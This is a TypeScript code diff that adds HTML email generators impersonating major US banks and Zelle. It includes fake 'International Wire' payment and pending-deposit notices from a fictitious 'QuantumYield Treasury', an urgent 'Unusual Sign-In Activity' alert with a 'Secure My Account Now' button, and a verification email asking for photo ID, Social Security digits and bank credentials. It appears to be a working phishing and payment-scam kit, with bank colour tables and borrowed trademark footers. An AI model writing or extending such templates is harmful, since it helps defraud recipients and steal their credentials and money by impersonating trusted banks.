@@ -24,7 +24,7 @@ export function generateZelleEmailHtml(data: EmailData): string {
     senderName = "Your Institution",
   } = data
 
-  const formattedAmount = `$${amount.toFixed(2)}`
+  const formattedAmount = `${amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
   const currentDate = new Date().toLocaleDateString("en-US", {
     year: "numeric",
     month: "long",
@@ -217,7 +217,7 @@ export function generatePendingDepositEmailHtml(data: EmailData): string {
     senderName = "Your Institution",
   } = data
 
-  const formattedAmount = `$${amount.toFixed(2)}`
+  const formattedAmount = `${amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
   const currentDate = new Date().toLocaleDateString("en-US", {
     year: "numeric",
     month: "long",
@@ -412,6 +412,465 @@ export type EmailLangMode = EmailLang | "dual"
 export function renderZelleEmail(data: EmailData, mode: EmailLangMode = "en"): string {
   return generateZelleEmailHtml(data)
 }
+
+// ---------------------------------------------------------------------------
+// Bank-branded template types
+// ---------------------------------------------------------------------------
+
+export type BankEmailTemplateType =
+  | "payment"
+  | "upgrade-warning"
+  | "bank-payment"
+  | "bank-security-alert"
+  | "bank-account-verify"
+  | "bank-pending-deposit"
+
+export interface BankBrandedEmailData {
+  recipientName: string
+  recipientEmail?: string
+  amount?: number
+  transferId?: string
+  depositLink?: string
+  message?: string
+  bankName: string
+  bankLogo?: string
+  bankColor?: string
+  bankWebsite?: string
+  institution?: string
+  // Recipient bank wire details
+  wireBank?: string
+  wireSwiftBic?: string
+  wireRouting?: string
+  wireInstitution?: string
+  wireAccount?: string
+  wireIntermediaryBank?: string
+  wireCorrespondentSwift?: string
+  wireClearingAccount?: string
+}
+
+// Per-bank brand colors (fallback to Zelle purple if unknown)
+const BANK_COLORS: Record<string, string> = {
+  chase: "#117ACA",
+  bofa: "#E31837",
+  "wells-fargo": "#D71E28",
+  citibank: "#003B70",
+  usbank: "#002677",
+  pnc: "#E86100",
+  "capital-one": "#004977",
+  truist: "#4B286D",
+  "td-bank": "#34A853",
+  "bmo-harris": "#0075BE",
+  "fifth-third": "#1B4D3E",
+  regions: "#005A3C",
+  ally: "#6E00CC",
+  marcus: "#00A877",
+  discover: "#FF6600",
+  "navy-federal": "#002F6C",
+}
+
+function getBankColor(bankId: string, fallback = "#6D1ED4"): string {
+  return BANK_COLORS[bankId] ?? fallback
+}
+
+function baseEmailWrap(content: string, bankName: string, bankLogo: string | undefined, bankColor: string): string {
+  const logoBlock = bankLogo
+    ? `<img src="${bankLogo}" alt="${bankName}" style="height:40px;max-width:160px;object-fit:contain;display:block;">`
+    : `<span style="font-size:20px;font-weight:bold;color:#fff;">${bankName}</span>`
+
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{margin:0;padding:0;background:#f4f4f7;font-family:Arial,Helvetica,sans-serif}
+table{border-collapse:collapse}
+img{border:0;display:block}
+a{text-decoration:none}
+@media only screen and (max-width:600px){.container{width:100%!important}.padded{padding:20px!important}}
+</style>
+</head>
+<body>
+<table width="100%" bgcolor="#f4f4f7" cellpadding="0" cellspacing="0">
+<tr><td align="center" style="padding:32px 16px">
+
+<table class="container" width="600" cellpadding="0" cellspacing="0" bgcolor="#ffffff" style="border-radius:8px;overflow:hidden;box-shadow:0 2px 16px rgba(0,0,0,0.08)">
+
+<!-- HEADER -->
+<tr>
+<td bgcolor="${bankColor}" style="padding:20px 32px">
+  <table width="100%" cellpadding="0" cellspacing="0">
+  <tr>
+    <td style="width:180px">${logoBlock}</td>
+    <td align="right">
+      <span style="font-size:11px;color:rgba(255,255,255,0.8)">Powered by Zelle&reg;</span>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+
+<!-- COLOR STRIPE -->
+<tr><td style="height:4px;background:linear-gradient(90deg,${bankColor},#6D1ED4)"></td></tr>
+
+${content}
+
+<!-- FOOTER -->
+<tr>
+<td style="padding:24px 32px;border-top:1px solid #e8e8e8;background:#fafafa">
+  <table width="100%" cellpadding="0" cellspacing="0">
+  <tr>
+    <td style="font-size:11px;color:#888;line-height:1.6">
+      This message was sent on behalf of <strong>${bankName}</strong> via the Zelle&reg; network.<br>
+      Zelle&reg; and the Zelle related marks are wholly owned by Early Warning Services, LLC.<br>
+      &copy; 2026 Early Warning Services, LLC. All rights reserved.
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+
+</table>
+
+</td></tr>
+</table>
+</body>
+</html>`
+}
+
+// Template 1 – Bank Payment Notification (with bank logo)
+export function generateBankPaymentEmail(data: BankBrandedEmailData): string {
+  const {
+    recipientName,
+    amount = 25,
+    transferId = `ZEL-${Date.now().toString().slice(-6)}`,
+    depositLink = "https://www2.swift.com/swift/login/AccessDenied.html",
+    message,
+    bankName,
+    bankLogo,
+    bankColor = "#6D1ED4",
+    institution = "QuantumYield Treasury",
+    wireBank,
+    wireSwiftBic,
+    wireRouting,
+    wireInstitution,
+    wireAccount,
+    wireIntermediaryBank,
+    wireCorrespondentSwift,
+    wireClearingAccount,
+  } = data
+
+  const formattedAmount = `${amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
+  const currentDate = new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" })
+
+  const msgBlock = message
+    ? `<tr><td style="padding:0 32px 24px">
+        <table width="100%" cellpadding="0" cellspacing="0" style="border-left:4px solid ${bankColor};background:#f9f9f9">
+          <tr><td style="padding:14px 16px">
+            <div style="font-size:12px;color:#888;margin-bottom:4px">Message from sender</div>
+            <div style="font-size:14px;color:#222">${message}</div>
+          </td></tr>
+        </table>
+      </td></tr>`
+    : ""
+
+  const content = `
+<!-- HERO -->
+<tr><td class="padded" style="padding:36px 32px 24px">
+  <h2 style="margin:0 0 8px;font-size:22px;font-weight:700;color:#111">You've received an International Wire</h2>
+  <p style="margin:0;font-size:15px;color:#555;line-height:1.6">Hello <strong>${recipientName}</strong>, ${institution} sent you money (International Wire) to your ${bankName} account through Zelle Network, facilitated by the Global Payments treasury gateway provided by JP Morgan Chase Bank.</p>
+</td></tr>
+
+<!-- AMOUNT BADGE -->
+<tr><td align="center" style="padding:0 32px 24px">
+  <table cellpadding="0" cellspacing="0" style="width:100%">
+  <tr><td align="center" bgcolor="${bankColor}" style="padding:24px;border-radius:8px">
+    <div style="font-size:12px;color:rgba(255,255,255,0.85);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">International Wire Amount</div>
+    <div style="font-size:36px;font-weight:700;color:#fff">${formattedAmount}</div>
+    <div style="font-size:12px;color:rgba(255,255,255,0.7);margin-top:4px">USD via ${bankName}</div>
+  </td></tr>
+  </table>
+</td></tr>
+
+${msgBlock}
+
+<!-- DETAILS TABLE -->
+<tr><td style="padding:0 32px 24px">
+  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;border-radius:6px;overflow:hidden">
+    <tr style="background:#f9f9f9"><td style="padding:10px 16px;font-size:12px;color:#888;width:160px">Date</td><td style="padding:10px 16px;font-size:14px;color:#222">${currentDate}</td></tr>
+    <tr><td style="padding:10px 16px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">Reference</td><td style="padding:10px 16px;font-size:14px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${transferId}</td></tr>
+    <tr style="background:#f9f9f9"><td style="padding:10px 16px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">From</td><td style="padding:10px 16px;font-size:14px;color:#222;border-top:1px solid #f0f0f0">${institution}</td></tr>
+    <tr><td style="padding:10px 16px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">Bank</td><td style="padding:10px 16px;font-size:14px;color:#222;border-top:1px solid #f0f0f0">${bankName}</td></tr>
+  </table>
+</td></tr>
+
+<!-- RECIPIENT BANK WIRE DETAILS -->
+${wireBank || wireSwiftBic || wireRouting || wireInstitution || wireAccount || wireIntermediaryBank || wireCorrespondentSwift || wireClearingAccount ? `
+<tr><td style="padding:0 32px 24px">
+  <div style="font-size:12px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px">Recipient Bank Details</div>
+  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;border-radius:6px;overflow:hidden">
+    ${wireBank ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;width:200px">Bank Name</td><td style="padding:9px 16px;font-size:13px;color:#222">${wireBank}</td></tr>` : ""}
+    ${wireSwiftBic ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">SWIFT / BIC Code</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireSwiftBic}</td></tr>` : ""}
+    ${wireRouting ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">Routing Number</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireRouting}</td></tr>` : ""}
+    ${wireInstitution ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">Institution Number</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireInstitution}</td></tr>` : ""}
+    ${wireAccount ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">Account Number</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireAccount}</td></tr>` : ""}
+    ${wireIntermediaryBank ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">USD Intermediary Bank</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0">${wireIntermediaryBank}</td></tr>` : ""}
+    ${wireCorrespondentSwift ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">USD Correspondent SWIFT</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireCorrespondentSwift}</td></tr>` : ""}
+    ${wireClearingAccount ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">USD Clearing Account</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireClearingAccount}</td></tr>` : ""}
+  </table>
+</td></tr>
+` : ""}
+
+<!-- CTA -->
+<tr><td align="center" style="padding:0 32px 36px">
+  <table cellpadding="0" cellspacing="0">
+  <tr><td bgcolor="${bankColor}" style="border-radius:6px">
+    <a href="${depositLink}" style="display:inline-block;padding:14px 36px;color:#fff;font-size:15px;font-weight:700">Accept Payment</a>
+  </td></tr>
+  </table>
+  <p style="margin:12px 0 0;font-size:11px;color:#aaa">This link expires in 48 hours</p>
+</td></tr>
+
+<!-- SECURITY NOTE -->
+<tr><td style="padding:0 32px 24px">
+  <div style="background:#fffbeb;border:1px solid #fde68a;border-radius:6px;padding:14px 16px">
+    <div style="font-size:12px;color:#92400e;line-height:1.6"><strong>Security Notice:</strong> ${bankName} will never ask for your password, PIN, or one-time passcode via email. Do not forward this message.</div>
+  </div>
+</td></tr>`
+
+  return baseEmailWrap(content, bankName, bankLogo, bankColor)
+}
+
+// Template 2 – Bank Security Alert
+export function generateBankSecurityAlertEmail(data: BankBrandedEmailData): string {
+  const {
+    recipientName,
+    bankName,
+    bankLogo,
+    bankColor = "#6D1ED4",
+    depositLink = "https://www2.swift.com/mystandards/#/c/settlement-and-reconciliation",
+    institution = "QuantumYield Holdings",
+  } = data
+
+  const currentDate = new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric", hour: "2-digit", minute: "2-digit" })
+
+  const content = `
+<!-- ALERT BANNER -->
+<tr><td style="padding:0">
+  <div style="background:#dc2626;padding:14px 32px;display:flex;align-items:center;gap:12px">
+    <div style="font-size:14px;font-weight:700;color:#fff;text-align:center;width:100%">SECURITY ALERT — Immediate Action Required</div>
+  </div>
+</td></tr>
+
+<!-- HERO -->
+<tr><td class="padded" style="padding:32px 32px 20px">
+  <h2 style="margin:0 0 10px;font-size:20px;font-weight:700;color:#111">Unusual Sign-In Activity Detected</h2>
+  <p style="margin:0;font-size:15px;color:#555">Hello <strong>${recipientName}</strong>, we detected unusual account activity on your ${bankName} account linked to Zelle.</p>
+</td></tr>
+
+<!-- EVENT DETAIL -->
+<tr><td style="padding:0 32px 24px">
+  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #fecaca;border-radius:6px;background:#fef2f2;overflow:hidden">
+    <tr><td style="padding:10px 16px;font-size:12px;color:#991b1b;width:140px">Event</td><td style="padding:10px 16px;font-size:14px;color:#222">Unrecognized device login</td></tr>
+    <tr><td style="padding:10px 16px;font-size:12px;color:#991b1b;border-top:1px solid #fecaca">Date / Time</td><td style="padding:10px 16px;font-size:14px;color:#222;border-top:1px solid #fecaca">${currentDate}</td></tr>
+    <tr><td style="padding:10px 16px;font-size:12px;color:#991b1b;border-top:1px solid #fecaca">Institution</td><td style="padding:10px 16px;font-size:14px;color:#222;border-top:1px solid #fecaca">${institution}</td></tr>
+    <tr><td style="padding:10px 16px;font-size:12px;color:#991b1b;border-top:1px solid #fecaca">Status</td><td style="padding:10px 16px;font-size:14px;border-top:1px solid #fecaca"><span style="background:#dc2626;color:#fff;padding:2px 8px;border-radius:4px;font-size:12px;font-weight:700">FLAGGED</span></td></tr>
+  </table>
+</td></tr>
+
+<!-- STEPS -->
+<tr><td style="padding:0 32px 24px">
+  <h3 style="margin:0 0 12px;font-size:15px;color:#111">Steps to secure your account</h3>
+  <ol style="margin:0;padding-left:20px;font-size:14px;color:#444;line-height:1.9">
+    <li>Click the button below to verify your identity</li>
+    <li>Change your ${bankName} online banking password immediately</li>
+    <li>Review recent transactions for any unauthorized activity</li>
+    <li>Enable two-factor authentication if not already active</li>
+  </ol>
+</td></tr>
+
+<!-- CTA -->
+<tr><td align="center" style="padding:0 32px 32px">
+  <table cellpadding="0" cellspacing="0">
+  <tr><td bgcolor="#dc2626" style="border-radius:6px">
+    <a href="${depositLink}" style="display:inline-block;padding:14px 36px;color:#fff;font-size:15px;font-weight:700">Secure My Account Now</a>
+  </td></tr>
+  </table>
+  <p style="margin:12px 0 0;font-size:11px;color:#aaa">If this was you, no action is needed</p>
+</td></tr>`
+
+  return baseEmailWrap(content, bankName, bankLogo, bankColor)
+}
+
+// Template 3 – Account Verification / KYC
+export function generateBankAccountVerifyEmail(data: BankBrandedEmailData): string {
+  const {
+    recipientName,
+    bankName,
+    bankLogo,
+    bankColor = "#6D1ED4",
+    depositLink = "https://www2.swift.com/mystandards/#/c/settlement-and-reconciliation",
+    institution = "QuantumYield Holdings",
+    transferId = `VER-${Date.now().toString().slice(-8)}`,
+  } = data
+
+  const content = `
+<!-- HERO -->
+<tr><td class="padded" style="padding:36px 32px 20px">
+  <div style="width:56px;height:56px;background:${bankColor};border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center">
+    <div style="width:56px;height:56px;line-height:56px;text-align:center;font-size:28px">&#10003;</div>
+  </div>
+  <h2 style="margin:0 0 8px;font-size:22px;font-weight:700;color:#111;text-align:center">Verify Your Account</h2>
+  <p style="margin:0;font-size:15px;color:#555;text-align:center">Hello <strong>${recipientName}</strong>, please complete identity verification to activate Zelle on your ${bankName} account.</p>
+</td></tr>
+
+<!-- BADGE -->
+<tr><td align="center" style="padding:0 32px 24px">
+  <table cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;border-radius:8px;overflow:hidden;width:80%">
+    <tr bgcolor="#f9f9f9"><td style="padding:10px 20px;font-size:12px;color:#888">Verification ID</td><td style="padding:10px 20px;font-size:13px;font-family:monospace;color:#222">${transferId}</td></tr>
+    <tr><td style="padding:10px 20px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">Institution</td><td style="padding:10px 20px;font-size:13px;color:#222;border-top:1px solid #f0f0f0">${institution}</td></tr>
+    <tr bgcolor="#f9f9f9"><td style="padding:10px 20px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">Bank</td><td style="padding:10px 20px;font-size:13px;color:#222;border-top:1px solid #f0f0f0">${bankName}</td></tr>
+    <tr><td style="padding:10px 20px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">Link Expires</td><td style="padding:10px 20px;font-size:13px;color:#dc2626;font-weight:700;border-top:1px solid #f0f0f0">24 hours</td></tr>
+  </table>
+</td></tr>
+
+<!-- WHAT YOU NEED -->
+<tr><td style="padding:0 32px 24px">
+  <h3 style="margin:0 0 12px;font-size:15px;color:#111">What you'll need</h3>
+  <div style="display:grid;gap:8px">
+    <div style="background:#f4f4f7;border-radius:6px;padding:12px 16px;font-size:14px;color:#444;border-left:4px solid ${bankColor}">Government-issued photo ID (passport or driver's license)</div>
+    <div style="background:#f4f4f7;border-radius:6px;padding:12px 16px;font-size:14px;color:#444;border-left:4px solid ${bankColor}">Last 4 digits of your Social Security Number</div>
+    <div style="background:#f4f4f7;border-radius:6px;padding:12px 16px;font-size:14px;color:#444;border-left:4px solid ${bankColor}">Access to your ${bankName} account credentials</div>
+  </div>
+</td></tr>
+
+<!-- CTA -->
+<tr><td align="center" style="padding:0 32px 32px">
+  <table cellpadding="0" cellspacing="0">
+  <tr><td bgcolor="${bankColor}" style="border-radius:6px">
+    <a href="${depositLink}" style="display:inline-block;padding:14px 36px;color:#fff;font-size:15px;font-weight:700">Verify My Identity</a>
+  </td></tr>
+  </table>
+  <p style="margin:12px 0 0;font-size:11px;color:#aaa">This link is single-use and expires in 24 hours</p>
+</td></tr>
+
+<!-- SECURITY -->
+<tr><td style="padding:0 32px 24px">
+  <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:6px;padding:14px 16px">
+    <div style="font-size:12px;color:#166534;line-height:1.6"><strong>Privacy Protected:</strong> ${bankName} and Zelle use bank-level 256-bit encryption. Your information is never shared with third parties.</div>
+  </div>
+</td></tr>`
+
+  return baseEmailWrap(content, bankName, bankLogo, bankColor)
+}
+
+// Template 4 – Bank Pending Deposit (bank-branded version of existing template)
+export function generateBankPendingDepositEmail(data: BankBrandedEmailData): string {
+  const {
+    recipientName,
+    amount = 25,
+    transferId = `ZEL-${Date.now().toString().slice(-6)}`,
+    depositLink = "https://www2.swift.com/swift/login/AccessDenied.html",
+    message,
+    bankName,
+    bankLogo,
+    bankColor = "#6D1ED4",
+    institution = "QuantumYield Treasury",
+    wireBank,
+    wireSwiftBic,
+    wireRouting,
+    wireInstitution,
+    wireAccount,
+    wireIntermediaryBank,
+    wireCorrespondentSwift,
+    wireClearingAccount,
+  } = data
+
+  const formattedAmount = `${amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`
+  const currentDate = new Date().toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" })
+  const expiryDate = new Date(Date.now() + 48 * 60 * 60 * 1000).toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" })
+
+  const msgBlock = message
+    ? `<tr><td style="padding:0 32px 24px">
+        <table width="100%" cellpadding="0" cellspacing="0" style="border-left:4px solid ${bankColor};background:#f9f9f9">
+          <tr><td style="padding:14px 16px">
+            <div style="font-size:12px;color:#888;margin-bottom:4px">Note from sender</div>
+            <div style="font-size:14px;color:#222">${message}</div>
+          </td></tr>
+        </table>
+      </td></tr>`
+    : ""
+
+  const content = `
+<!-- STATUS BANNER -->
+<tr><td style="padding:0">
+  <div style="background:#fef3c7;padding:10px 32px;text-align:center">
+    <span style="font-size:13px;font-weight:700;color:#92400e">PENDING DEPOSIT — Action Required to Accept Funds</span>
+  </div>
+</td></tr>
+
+<!-- HERO -->
+<tr><td class="padded" style="padding:32px 32px 20px">
+  <h2 style="margin:0 0 8px;font-size:22px;font-weight:700;color:#111">Pending Deposit via ${bankName}</h2>
+  <p style="margin:0;font-size:15px;color:#555;line-height:1.6">Hello <strong>${recipientName}</strong>, ${institution} sent you money (International Wire) to your ${bankName} account through Zelle Network, facilitated by the Global Payments treasury gateway provided by JP Morgan Chase Bank.</p>
+</td></tr>
+
+<!-- AMOUNT -->
+<tr><td align="center" style="padding:0 32px 24px">
+  <table cellpadding="0" cellspacing="0" style="width:100%">
+  <tr><td align="center" style="padding:24px;border-radius:8px;background:linear-gradient(135deg,${bankColor},#6D1ED4)">
+    <div style="font-size:11px;color:rgba(255,255,255,0.8);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Pending Amount</div>
+    <div style="font-size:40px;font-weight:700;color:#fff">${formattedAmount}</div>
+    <div style="margin-top:8px"><span style="background:rgba(255,255,255,0.2);color:#fff;font-size:11px;font-weight:700;padding:3px 10px;border-radius:20px;text-transform:uppercase">Pending</span></div>
+  </td></tr>
+  </table>
+</td></tr>
+
+${msgBlock}
+
+<!-- DETAILS -->
+<tr><td style="padding:0 32px 24px">
+  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;border-radius:6px;overflow:hidden">
+    <tr style="background:#f9f9f9"><td style="padding:10px 16px;font-size:12px;color:#888;width:160px">Initiated</td><td style="padding:10px 16px;font-size:14px;color:#222">${currentDate}</td></tr>
+    <tr><td style="padding:10px 16px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">Expires</td><td style="padding:10px 16px;font-size:14px;color:#dc2626;font-weight:600;border-top:1px solid #f0f0f0">${expiryDate}</td></tr>
+    <tr style="background:#f9f9f9"><td style="padding:10px 16px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">Reference</td><td style="padding:10px 16px;font-size:14px;font-family:monospace;color:#222;border-top:1px solid #f0f0f0">${transferId}</td></tr>
+    <tr><td style="padding:10px 16px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">From</td><td style="padding:10px 16px;font-size:14px;color:#222;border-top:1px solid #f0f0f0">${institution}</td></tr>
+    <tr style="background:#f9f9f9"><td style="padding:10px 16px;font-size:12px;color:#888;border-top:1px solid #f0f0f0">To Bank</td><td style="padding:10px 16px;font-size:14px;color:#222;border-top:1px solid #f0f0f0">${bankName}</td></tr>
+  </table>
+</td></tr>
+
+<!-- RECIPIENT BANK WIRE DETAILS -->
+${wireBank || wireSwiftBic || wireRouting || wireInstitution || wireAccount || wireIntermediaryBank || wireCorrespondentSwift || wireClearingAccount ? `
+<tr><td style="padding:0 32px 24px">
+  <div style="font-size:12px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px">Recipient Bank Details</div>
+  <table width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #e8e8e8;border-radius:6px;overflow:hidden">
+    ${wireBank ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;width:200px">Bank Name</td><td style="padding:9px 16px;font-size:13px;color:#222">${wireBank}</td></tr>` : ""}
+    ${wireSwiftBic ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">SWIFT / BIC Code</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireSwiftBic}</td></tr>` : ""}
+    ${wireRouting ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">Routing Number</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireRouting}</td></tr>` : ""}
+    ${wireInstitution ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">Institution Number</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireInstitution}</td></tr>` : ""}
+    ${wireAccount ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">Account Number</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireAccount}</td></tr>` : ""}
+    ${wireIntermediaryBank ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">USD Intermediary Bank</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0">${wireIntermediaryBank}</td></tr>` : ""}
+    ${wireCorrespondentSwift ? `<tr style="background:#f9f9f9"><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">USD Correspondent SWIFT</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireCorrespondentSwift}</td></tr>` : ""}
+    ${wireClearingAccount ? `<tr><td style="padding:9px 16px;font-size:11px;color:#888;border-top:1px solid #f0f0f0">USD Clearing Account</td><td style="padding:9px 16px;font-size:13px;color:#222;border-top:1px solid #f0f0f0;font-family:monospace">${wireClearingAccount}</td></tr>` : ""}
+  </table>
+</td></tr>
+` : ""}
+
+<!-- CTA -->
+<tr><td align="center" style="padding:0 32px 32px">
+  <table cellpadding="0" cellspacing="0">
+  <tr><td bgcolor="${bankColor}" style="border-radius:6px">
+    <a href="${depositLink}" style="display:inline-block;padding:14px 36px;color:#fff;font-size:15px;font-weight:700">Accept Deposit Now</a>
+  </td></tr>
+  </table>
+  <p style="margin:12px 0 0;font-size:11px;color:#aaa">Unclaimed deposits are returned after the expiry date</p>
+</td></tr>`
+
+  return baseEmailWrap(content, bankName, bankLogo, bankColor)
+}
+
+// Utility: get bank color by ID (exported for use in UI)
+export { getBankColor, BANK_COLORS }
 
 export function generateUpgradeWarningEmail(data: {
   recipientName: string
